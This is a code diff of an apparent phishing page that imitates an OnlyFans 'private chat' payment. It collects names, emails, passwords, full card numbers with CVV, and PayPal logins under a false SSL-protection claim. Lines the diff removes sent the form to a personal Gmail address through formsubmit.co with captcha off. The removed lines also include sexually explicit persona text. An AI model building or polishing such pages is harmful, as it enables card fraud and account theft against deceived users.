@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Oksana Payment</title>
   <style>
     body {
@@ -13,6 +13,8 @@
       position: relative;
       transition: direction 0.3s ease;
     }
+
+    /* لوجو OnlyFans في زاوية الصفحة */
     #onlyfans-logo {
       position: fixed;
       top: 20px;
@@ -23,21 +25,9 @@
       user-select: none;
       filter: drop-shadow(0 0 5px rgba(0,0,0,0.3));
     }
-    .banner {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      background-color: #0d1117;
-      margin-top: 20px;
-      border-radius: 12px;
-    }
-    .banner img {
-      max-width: 100%;
-      height: auto;
-    }
+
     .container {
-      max-width: 900px;
+      max-width: 400px;
       margin: 80px auto;
       background: #ffffff;
       padding: 30px;
@@ -45,23 +35,17 @@
       box-shadow: 0 5px 15px rgba(0,0,0,0.1);
       position: relative;
       z-index: 10;
-      display: flex;
-      gap: 30px;
-      flex-wrap: wrap;
-      justify-content: center;
     }
-    form {
-      flex: 1 1 400px;
-      min-width: 300px;
-    }
+
     h2 {
       text-align: center;
       color: #cc0033;
       margin-bottom: 20px;
     }
-    input, button {
+
+    input, select, button {
       width: 100%;
-      padding: 14px;
+      padding: 14px 14px 14px 180px; /* زودنا padding-left ليواكب حجم الصورة */
       margin-bottom: 15px;
       font-size: 16px;
       border-radius: 10px;
@@ -69,11 +53,22 @@
       box-sizing: border-box;
       box-shadow: 0 0 8px rgba(204, 0, 51, 0.5);
       transition: box-shadow 0.3s ease;
+      background-repeat: no-repeat;
+      background-position: 24px center;
+      background-size: 180px 114px; /* 3 أضعاف الحجم الأصلي */
     }
-    input:focus, button:focus {
+    input:focus, select:focus, button:focus {
       outline: none;
       box-shadow: 0 0 12px rgba(204, 0, 51, 0.8);
     }
+
+    #input-card {
+      background-image: url('https://i.postimg.cc/1XzRbMnp/visa-Card001.jpg');
+      background-size: 180px 114px; /* 3 أضعاف الحجم الأصلي */
+      background-position: 24px center;
+      padding-left: 220px; /* لتوفير مساحة كافية للصورة */
+    }
+
     button {
       background-color: #cc0033;
       color: #fff;
@@ -83,10 +78,23 @@
       box-shadow: 0 0 12px rgba(204, 0, 51, 0.7);
       transition: background-color 0.3s ease, box-shadow 0.3s ease;
     }
+
     button:hover {
       background-color: #990026;
       box-shadow: 0 0 20px rgba(153, 0, 38, 0.9);
     }
+
+    .payment-switch {
+      text-align: center;
+      color: #555;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: -5px;
+      margin-bottom: 15px;
+      text-decoration: underline;
+      user-select: none;
+    }
+
     .security-note {
       text-align: center;
       color: #444;
@@ -101,16 +109,97 @@
       width: 18px;
       height: 18px;
     }
-    .payment-switch {
+
+    /* مودال بايبال */
+    #paypalModal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.6);
+      backdrop-filter: blur(3px);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .paypal-content {
+      background: white;
+      padding: 30px;
+      border-radius: 16px;
+      width: 300px;
       text-align: center;
-      color: #555;
-      font-size: 14px;
+      position: relative;
+    }
+
+    .paypal-content input {
+      margin-bottom: 12px;
+      padding-left: 14px;
+      background: none;
+      background-image: none !important;
+    }
+
+    .close-modal {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 18px;
       cursor: pointer;
-      margin-top: -5px;
-      margin-bottom: 15px;
-      text-decoration: underline;
       user-select: none;
     }
+
+    /* أيقونات تطفو */
+    @keyframes floatIcon {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-6px); }
+      100% { transform: translateY(0); }
+    }
+
+    .social-icons {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      z-index: 9999;
+      display: flex;
+      gap: 14px;
+    }
+
+    .social-icons a img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: white;
+      padding: 5px;
+      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.25);
+      animation: floatIcon 3s ease-in-out infinite;
+    }
+
+    /* صور جانبية */
+    #side-left, #side-right {
+      position: fixed;
+      top: 0;
+      width: 200px;
+      height: 100vh;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      opacity: 0.2;
+      filter: blur(2px);
+      animation: floatSide 8s ease-in-out infinite alternate;
+      z-index: 1;
+      pointer-events: none;
+      transition: background-image 0.5s ease-in-out;
+    }
+
+    #side-left { left: 0; animation-delay: 0s; }
+    #side-right { right: 0; animation-delay: 2s; }
+
+    @keyframes floatSide {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(30px); }
+    }
+
+    /* زر اللغة */
     .lang-switch {
       position: fixed;
       top: 15px;
@@ -127,149 +216,124 @@
       z-index: 10000;
       user-select: none;
     }
+
     .lang-switch img {
       width: 24px;
       height: 16px;
       object-fit: cover;
       border-radius: 3px;
     }
-    #side-left, #side-right {
-      position: fixed;
-      top: 0;
-      width: 200px;
-      height: 100vh;
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      opacity: 0.2;
-      filter: blur(2px);
-      animation: floatSide 8s ease-in-out infinite alternate;
-      z-index: 1;
-      pointer-events: none;
-      transition: background-image 0.5s ease-in-out;
-    }
-    #side-left { left: 0; animation-delay: 0s; }
-    #side-right { right: 0; animation-delay: 2s; }
-    @keyframes floatSide {
-      0% { transform: translateY(0); }
-      100% { transform: translateY(30px); }
-    }
 
-    /* Biography & Specs box */
-    .bio-specs {
-      flex: 0 0 320px;
-      background: #000;
-      color: #fff;
-      border-radius: 12px;
-      padding: 20px;
-      font-size: 14px;
-      box-shadow: 0 0 15px rgba(204, 0, 51, 0.8);
-      user-select: text;
-      line-height: 1.5;
-      max-height: 600px;
-      overflow-y: auto;
-    }
-    .bio-specs h3 {
-      color: #ff6600; /* برتقالي */
-      margin-top: 0;
-      margin-bottom: 10px;
-      font-weight: bold;
-      font-size: 18px;
-      border-bottom: 1px solid #ff6600;
-      padding-bottom: 4px;
-    }
-    .bio-specs p {
-      margin-bottom: 12px;
-      white-space: pre-wrap; /* يحافظ على التنسيق الأسطر */
-    }
-    .bio-specs ul {
-      list-style: none;
-      padding-left: 0;
-      margin: 0;
-    }
-    .bio-specs ul li {
-      margin-bottom: 8px;
-    }
-    .bio-specs ul li strong {
-      color: #ff6600;
-    }
+    @media (max-width: 768px) {
+      #side-left, #side-right {
+        display: none;
+      }
 
+      .container {
+        width: 90%;
+        padding: 20px;
+      }
+
+      .social-icons {
+        bottom: 15px;
+        left: 15px;
+        gap: 10px;
+      }
+
+      .social-icons a img {
+        width: 34px;
+        height: 34px;
+        padding: 4px;
+      }
+
+      /* تصغير لوجو OnlyFans على الجوال */
+      #onlyfans-logo {
+        width: 120px;
+        top: 10px;
+        left: 10px;
+      }
+
+      input, select, button {
+        padding-left: 90px !important; /* تقليل البادينغ على الجوال */
+        background-size: 90px 57px !important;
+      }
+
+      #input-card {
+        padding-left: 110px !important;
+        background-size: 90px 57px !important;
+      }
+    }
   </style>
 </head>
 <body>
+
+  <!-- لوجو OnlyFans -->
   <img id="onlyfans-logo" src="https://i.postimg.cc/N0r9B3nF/Only-Fans-Logo.png" alt="OnlyFans Logo" />
-  <div class="lang-switch" onclick="toggleLanguage()">
-    <img id="lang-flag" src="https://flagcdn.com/us.svg" alt="Language Flag" />
-    <span id="lang-text">English</span>
-  </div>
+
+  <!-- الصور الجانبية -->
   <div id="side-left"></div>
   <div id="side-right"></div>
+
+  <!-- زر تبديل اللغة -->
+  <div class="lang-switch" onclick="toggleLanguage()" role="button" tabindex="0" aria-label="Toggle Language">
+    <img id="lang-flag" src="https://flagcdn.com/us.svg" alt="English Flag" />
+    <span id="lang-text">English</span>
+  </div>
+
+  <!-- نموذج الدفع -->
   <div class="container">
+    <h2 id="form-title">Join Private Chat</h2>
     <form id="paymentForm">
-      <h2 id="form-title">Join Private Chat</h2>
-      <input id="input-name" type="text" placeholder="Full Name" required />
-      <input id="input-email" type="email" placeholder="Email Address" required />
-      <input id="input-password" type="password" placeholder="Password" required />
+      <input id="input-name" type="text" placeholder="Full Name" required>
+      <input id="input-email" type="email" placeholder="Email Address" required>
+      <input id="input-password" type="password" placeholder="Password" required>
+
+      <!-- Visa Fields -->
       <div id="visaFields">
-        <input id="input-card" type="text" placeholder="Card Number" required />
-        <input id="input-expiry" type="text" placeholder="MM/YY" required />
-        <input id="input-cvv" type="text" placeholder="CVV" required />
-        <div class="banner">
-          <img src="1d958c71-1631-4efd-a448-76352aa881e0.png" alt="Your transactions are protected" />
-        </div>
+        <input id="input-card" type="text" placeholder="Card Number" required>
+        <input id="input-expiry" type="text" placeholder="MM/YY" required>
+        <input id="input-cvv" type="text" placeholder="CVV" required>
       </div>
+
       <div class="security-note" aria-live="polite">
-        <img
-          src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Font_Awesome_5_solid_lock.svg"
-          alt="Lock Icon"
-        />
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Font_Awesome_5_solid_lock.svg" alt="Lock Icon" />
         <span id="security-text">Your information is fully encrypted and protected by SSL.</span>
       </div>
-      <button type="submit" id="payButton">Pay with Visa</button>
-      <div
-        class="payment-switch"
-        onclick="switchPayment()"
-        role="button"
-        tabindex="0"
-        aria-label="Switch Payment Method"
-      >
-        Switch to PayPal
-      </div>
-    </form>
-    <form id="paymentForm" action="https://formsubmit.co/mr.joker1442@gmail.com" method="POST">
-<input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="box">
 
-    <div class="bio-specs" aria-label="Biography and Specifications">
-      <h3>About Oksana Petrova</h3>
-      <p>
-        I'm a loving mother and a wonderful wife, but I'm also a very shameless whore! My husband was
-        against his wife being fucked by anyone who wants to, but then of course he accepted it. I direct
-        and shoot everything myself and nobody helps me, I just want to share my films with you, I want you
-        to see me for who I am. I love you all, all my fans and friends, and I do my best just for you!
-      </p>
-      <h3>Present</h3>
-      <ul>
-        <li><strong>Gender:</strong> Female</li>
-        <li><strong>Measurements:</strong> 32--</li>
-        <li><strong>Height:</strong> 5 ft 8 in (173 cm)</li>
-        <li><strong>Ethnicity:</strong> White</li>
-        <li><strong>Hair Color:</strong> Brunette</li>
-        <li><strong>Eye Color:</strong> Blue</li>
-        <li><strong>Fake Boobs:</strong> No</li>
-        <li><strong>Tattoos:</strong> No</li>
-        <li><strong>Piercings:</strong> No</li>
-        <li><strong>Turn Ons:</strong> I love being an obedient bitch!</li>
-      </ul>
+      <button type="submit" id="payButton">Pay with Visa</button>
+      <div class="payment-switch" onclick="switchPayment()" role="button" tabindex="0" aria-label="Switch Payment Method">Switch to PayPal</div>
+    </form>
+  </div>
+
+  <!-- PayPal Modal -->
+  <div id="paypalModal" role="dialog" aria-modal="true" aria-labelledby="paypal-title" tabindex="-1">
+    <div class="paypal-content">
+      <span class="close-modal" onclick="closeModal()" role="button" tabindex="0" aria-label="Close Modal">&times;</span>
+      <h3 id="paypal-title">Pay with PayPal</h3>
+      <input id="paypal-email" type="email" placeholder="PayPal Email" required>
+      <input id="paypal-password" type="password" placeholder="Password" required>
+      <button onclick="submitPaypal()">Pay</button>
     </div>
   </div>
+
+  <!-- أيقونات TikTok & Facebook -->
+  <div class="social-icons">
+    <a href="https://www.tiktok.com/@oksana.petrova57" target="_blank" rel="noopener noreferrer" aria-label="TikTok Profile">
+      <img src="https://i.postimg.cc/5yV2Cdxx/tiktok.png" alt="TikTok Icon">
+    </a>
+    <a href="https://www.facebook.com/profile.php?id=61577063923281" target="_blank" rel="noopener noreferrer" aria-label="Facebook Profile">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Icon">
+    </a>
+  </div>
+
   <script>
     let isHebrew = false;
-    let currentMethod = "visa";
+    let currentMethod = 'visa';
+
+    // ترجمة النصوص للغة
     const translations = {
       en: {
         langText: "English",
-        formTitle: "Join Private Chat",
         placeholderName: "Full Name",
         placeholderEmail: "Email Address",
         placeholderPassword: "Password",
@@ -277,13 +341,19 @@
         placeholderExpiry: "MM/YY",
         placeholderCVV: "CVV",
         securityText: "Your information is fully encrypted and protected by SSL.",
-        payButton: "Pay with Visa",
+        payButtonVisa: "Pay with Visa",
+        payButtonPaypal: "Pay with PayPal",
         switchToPaypal: "Switch to PayPal",
         switchToVisa: "Switch to Visa",
+        formTitle: "Join Private Chat",
+        paypalTitle: "Pay with PayPal",
+        paypalEmail: "PayPal Email",
+        paypalPassword: "Password",
+        alertVisa: "Visa payment simulated ✅",
+        alertPaypal: "PayPal payment simulated ✅",
       },
       he: {
         langText: "עברית",
-        formTitle: "הצטרף לשיחה פרטית",
         placeholderName: "שם מלא",
         placeholderEmail: "דואר אלקטרוני",
         placeholderPassword: "סיסמה",
@@ -291,57 +361,102 @@
         placeholderExpiry: "חודש/שנה",
         placeholderCVV: "קוד אבטחה",
         securityText: "המידע שלך מוצפן ומוגן ב-SSL.",
-        payButton: "שלם עם ויזה",
+        payButtonVisa: "שלם עם ויזה",
+        payButtonPaypal: "שלם עם PayPal",
         switchToPaypal: "החלף ל-PayPal",
         switchToVisa: "החלף לוויזה",
-      },
+        formTitle: "הצטרף לשיחה פרטית",
+        paypalTitle: "שלם עם PayPal",
+        paypalEmail: "דואר אלקטרוני של PayPal",
+        paypalPassword: "סיסמה",
+        alertVisa: "תשלום ויזה מדומה ✅",
+        alertPaypal: "תשלום PayPal מדומה ✅",
+      }
     };
+
     function applyLanguage() {
-      const lang = isHebrew ? "he" : "en";
+      const lang = isHebrew ? 'he' : 'en';
       document.documentElement.lang = lang;
-      document.documentElement.dir = isHebrew ? "rtl" : "ltr";
-      document.getElementById("lang-text").innerText = translations[lang].langText;
-      document.getElementById("lang-flag").src = isHebrew
-        ? "https://flagcdn.com/il.svg"
-        : "https://flagcdn.com/us.svg";
-      document.getElementById("form-title").innerText = translations[lang].formTitle;
-      document.getElementById("input-name").placeholder = translations[lang].placeholderName;
-      document.getElementById("input-email").placeholder = translations[lang].placeholderEmail;
-      document.getElementById("input-password").placeholder = translations[lang].placeholderPassword;
-      document.getElementById("input-card").placeholder = translations[lang].placeholderCard;
-      document.getElementById("input-expiry").placeholder = translations[lang].placeholderExpiry;
-      document.getElementById("input-cvv").placeholder = translations[lang].placeholderCVV;
-      document.getElementById("security-text").innerText = translations[lang].securityText;
-      document.getElementById("payButton").innerText = translations[lang].payButton;
-      document.querySelector(".payment-switch").innerText =
-        currentMethod === "visa" ? translations[lang].switchToPaypal : translations[lang].switchToVisa;
+      document.documentElement.dir = isHebrew ? 'rtl' : 'ltr';
+
+      document.getElementById('lang-text').innerText = translations[lang].langText;
+      document.getElementById('lang-flag').src = isHebrew ? 'https://flagcdn.com/il.svg' : 'https://flagcdn.com/us.svg';
+      document.getElementById('lang-flag').alt = isHebrew ? 'Israeli Flag' : 'US Flag';
+
+      document.getElementById('input-name').placeholder = translations[lang].placeholderName;
+      document.getElementById('input-email').placeholder = translations[lang].placeholderEmail;
+      document.getElementById('input-password').placeholder = translations[lang].placeholderPassword;
+      document.getElementById('input-card').placeholder = translations[lang].placeholderCard;
+      document.getElementById('input-expiry').placeholder = translations[lang].placeholderExpiry;
+      document.getElementById('input-cvv').placeholder = translations[lang].placeholderCVV;
+      document.getElementById('security-text').innerText = translations[lang].securityText;
+      document.getElementById('payButton').innerText = currentMethod === 'visa' ? translations[lang].payButtonVisa : translations[lang].payButtonPaypal;
+      document.querySelector('.payment-switch').innerText = currentMethod === 'visa' ? translations[lang].switchToPaypal : translations[lang].switchToVisa;
+      document.getElementById('form-title').innerText = translations[lang].formTitle;
+      document.getElementById('paypal-title').innerText = translations[lang].paypalTitle;
+      document.getElementById('paypal-email').placeholder = translations[lang].paypalEmail;
+      document.getElementById('paypal-password').placeholder = translations[lang].paypalPassword;
     }
+
     function toggleLanguage() {
       isHebrew = !isHebrew;
       applyLanguage();
     }
+
     function switchPayment() {
-      alert("PayPal modal logic can be added here.");
-      currentMethod = currentMethod === "visa" ? "paypal" : "visa";
+      if (currentMethod === 'visa') {
+        document.getElementById('visaFields').style.display = 'none';
+        document.getElementById('paypalModal').style.display = 'flex';
+        currentMethod = 'paypal';
+      } else {
+        document.getElementById('paypalModal').style.display = 'none';
+        document.getElementById('visaFields').style.display = 'block';
+        currentMethod = 'visa';
+      }
       applyLanguage();
     }
+
+    function closeModal() {
+      document.getElementById('paypalModal').style.display = 'none';
+      document.getElementById('visaFields').style.display = 'block';
+      currentMethod = 'visa';
+      applyLanguage();
+    }
+
+    function submitPaypal() {
+      alert(isHebrew ? translations.he.alertPaypal : translations.en.alertPaypal);
+      closeModal();
+    }
+
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      if (currentMethod === 'visa') {
+        alert(isHebrew ? translations.he.alertVisa : translations.en.alertVisa);
+      }
+    });
+
+    // صور الجانبين
     const images = [
       "https://i.postimg.cc/KzByqhfh/photo-2025-06-19-23-12-19.jpg",
       "https://i.postimg.cc/90LZsKXJ/photo-2025-06-19-22-53-16.jpg",
       "https://i.postimg.cc/28J26LmT/photo-2025-06-19-23-16-02-2.jpg",
       "https://i.postimg.cc/DzQgBCGY/photo-2025-06-19-23-16-02.jpg",
-      "https://i.postimg.cc/BbzcXRWt/photo-2025-06-19-23-14-34.jpg",
+      "https://i.postimg.cc/BbzcXRWt/photo-2025-06-19-23-14-34.jpg"
     ];
+
     let index = 0;
     function changeImages() {
-      const left = document.getElementById("side-left");
-      const right = document.getElementById("side-right");
+      const left = document.getElementById('side-left');
+      const right = document.getElementById('side-right');
       index = (index + 1) % images.length;
       left.style.backgroundImage = `url('${images[index]}')`;
       right.style.backgroundImage = `url('${images[(index + 1) % images.length]}')`;
     }
-    document.getElementById("side-left").style.backgroundImage = `url('${images[0]}')`;
-    document.getElementById("side-right").style.backgroundImage = `url('${images[1]}')`;
+
+    // إعداد البداية
+    document.getElementById('side-left').style.backgroundImage = `url('${images[0]}')`;
+    document.getElementById('side-right').style.backgroundImage = `url('${images[1]}')`;
+
     setInterval(changeImages, 5000);
     applyLanguage();
   </script>
